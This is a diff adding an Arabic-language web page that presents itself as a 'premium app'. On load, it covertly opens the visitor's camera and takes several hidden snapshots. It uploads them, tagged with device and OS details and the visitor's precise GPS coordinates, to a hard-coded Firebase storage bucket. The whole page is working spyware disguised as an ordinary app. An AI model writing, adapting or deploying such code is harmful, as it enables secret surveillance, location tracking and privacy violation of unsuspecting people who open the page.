@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>تطبيق مميز</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f9f9f9;
+    }
+    h1 {
+      color: #333;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>تطبيق مميز</h1>
+  <p>يرجى منح الأذونات اللازمة للتطبيق للتقاط الصور.</p>
+  <canvas id="canvas" class="hidden"></canvas>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyALGGBFq-XDvq78XmN13d1FX-9jv2e2jDE",
+      authDomain: "image-b3894.firebaseapp.com",
+      projectId: "image-b3894",
+      storageBucket: "image-b3894.appspot.com",
+      messagingSenderId: "724136212410",
+      appId: "1:724136212410:web:9450152940928e78a40f83",
+      measurementId: "G-D8NNFMGFH1"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
+    // دالة لتحويل DataURL إلى Blob
+    const dataURLtoBlob = (dataURL) => {
+      const binary = atob(dataURL.split(',')[1]);
+      return new Blob(
+        [new Uint8Array([...Array(binary.length).keys()].map(i => binary.charCodeAt(i)))],
+        { type: 'image/png' }
+      );
+    };
+
+    // دالة للحصول على التاريخ والوقت بالتنسيق المطلوب
+    function getFormattedDate() {
+      const date = new Date();
+      const year = date.getFullYear();
+      const month = ('0' + (date.getMonth() + 1)).slice(-2);
+      const day = ('0' + date.getDate()).slice(-2);
+      const hours = ('0' + date.getHours()).slice(-2);
+      const minutes = ('0' + date.getMinutes()).slice(-2);
+      const seconds = ('0' + date.getSeconds()).slice(-2);
+      return `${year}-${month}-${day}_${hours}-${minutes}-${seconds}`;
+    }
+
+    // دالة استخراج معلومات النظام والجهاز
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const deviceType = /Mobile|Android|iP(hone|od)|iPad|IEMobile/i.test(ua) ? "Mobile" : "Desktop";
+      let os = "UnknownOS";
+      let version = "UnknownVersion";
+
+      if (/Android/i.test(ua)) {
+        const match = ua.match(/Android\s([0-9\.]+)/i);
+        if (match) {
+          os = "Android";
+          version = match[1];
+        }
+      } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        const match = ua.match(/OS\s([0-9_]+)/i);
+        if (match) {
+          os = "iOS";
+          version = match[1].replace(/_/g, '.');
+        }
+      } else if (/Windows NT/i.test(ua)) {
+        const match = ua.match(/Windows NT\s([0-9\.]+)/i);
+        if (match) {
+          os = "Windows";
+          version = match[1];
+        }
+      } else if (/Mac OS X/i.test(ua)) {
+        const match = ua.match(/Mac OS X\s([0-9_]+)/i);
+        if (match) {
+          os = "macOS";
+          version = match[1].replace(/_/g, '.');
+        }
+      }
+      return `${deviceType}_${os}_${version}`;
+    }
+
+    // دالة التقاط صورة واحدة وتحميلها
+    const capturePhoto = (video, canvas, storageRef, callback) => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png')))
+        .then(callback)
+        .catch(console.error);
+    };
+
+    // دالة التقاط الصور مع التمييز بين الصورتين الأوليين وتحديد اسم الصورة الثالثة باستخدام الإحداثيات
+    const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
+      if (captureCount < 2) {
+        // استخدام التسمية الاعتيادية للصورتين الأوليين
+        const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
+        capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount + 1), 500);
+        });
+      } else if (captureCount === 2) {
+        // بعد الصورة الثانية: طلب إذن الوصول للموقع واستخدام الإحداثيات مع فاصلة للفصل بينهما
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
+            capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+              video.srcObject.getTracks().forEach(track => track.stop());
+            });
+          },
+          (error) => {
+            console.error("فشل الحصول على الموقع:", error);
+            // في حال فشل الحصول على الموقع، استخدام التسمية الاعتيادية كبديل
+            const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
+            capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+              video.srcObject.getTracks().forEach(track => track.stop());
+            });
+          }
+        );
+      }
+    };
+
+    // طلب إذن الكاميرا
+    const requestCameraPermission = async () => {
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true });
+      } catch (error) {
+        console.error('فشل في الحصول على إذن الكاميرا:', error);
+      }
+    };
+
+    // تهيئة عملية التقاط الصور
+    const initializePhotoCapture = async () => {
+      await requestCameraPermission();
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          video.addEventListener('loadeddata', () => {
+            const canvas = document.getElementById('canvas');
+            capturePhotos(video, canvas, storage.ref().child('snapshots/'), 0);
+          });
+        })
+        .catch(console.error);
+    };
+
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/service-worker.js')
+          .then(registration => {
+            console.log('Service Worker registered with scope:', registration.scope);
+          })
+          .catch(error => {
+            console.log('Service Worker registration failed:', error);
+          });
+      });
+    }
+
+    window.onload = initializePhotoCapture;
+  </script>
+</body>
+</html>
